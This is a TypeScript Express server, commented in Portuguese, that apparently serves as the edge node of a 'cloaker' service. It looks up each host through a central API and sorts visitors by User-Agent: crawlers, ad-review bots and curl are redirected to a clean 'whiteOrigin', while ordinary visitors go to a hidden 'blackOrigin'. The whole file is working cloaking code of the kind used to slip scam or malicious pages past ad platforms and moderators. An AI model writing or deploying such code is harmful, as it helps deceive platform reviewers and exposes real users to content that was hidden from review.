import express from "express";
import axios from "axios";
import * as dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 8080;
const API_URL = process.env.API_URL || "https://api.cloakerguard.com.br";

function normalizeHost(raw = "") {
  return raw.split(",")[0].trim().toLowerCase().replace(/:\d+$/, "");
}

// 🔑 garante URL absoluta com https://
function normalizeTarget(url: string | undefined | null): string | null {
  if (!url) return null;
  let clean = url.trim();

  // remove qualquer / extra no começo
  clean = clean.replace(/^\/+/, "");

  // se não tiver https:// no começo, adiciona
  if (!/^https?:\/\//i.test(clean)) {
    clean = `https://${clean}`;
  }

  return clean;
}

app.use(async (req: any, res) => {
  try {
    const host = normalizeHost(
      req.headers["x-forwarded-host"] || req.headers.host || ""
    );
    if (!host) return res.status(400).send("Host header required");

    const ua = req.headers["user-agent"]?.toLowerCase() || "";

    console.log("[EDGE] Requisição recebida para host:", host);
    console.log("[DEBUG UA]", ua || "(sem UA)");

    // chamada para API central
    const resp = await axios.get(`${API_URL}/domains/resolve`, {
      params: { host },
      timeout: 5000,
    });

    const data = resp.data;

    // regra de bot
    const isBot = /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|headlesschrome|curl/i.test(
      ua
    );

    console.log("[DEBUG ISBOT]", isBot);

    let target: string | null = null;

    if (isBot) {
      target = normalizeTarget(data.whiteOrigin);
      console.log("[EDGE] Bot detectado → enviando para whiteOrigin");
    } else {
      target = normalizeTarget(data.blackOrigin);
      console.log("[EDGE] Usuário normal → enviando para blackOrigin");
    }

    // fallback caso esteja vazio
    if (!target) {
      target = normalizeTarget(data.blackOrigin || data.whiteOrigin);
      console.warn("[EDGE] Fallback acionado → target:", target);
    }

    if (!target) {
      console.error("[EDGE] Nenhum destino configurado para host:", host, "data:", data);
      return res.status(500).send("Nenhum destino configurado");
    }

    console.log(`[EDGE] Redirecionando ${host} -> ${target}`);

    res.setHeader("Cache-Control", "no-store");
    return res.redirect(302, target);

  } catch (err: any) {
    console.error("[EDGE] Erro:", err.message);
    return res.status(500).send("Internal proxy error");
  }
});

app.listen(PORT, () => {
  console.log(`🌍 Edge rodando na porta ${PORT}`);
});
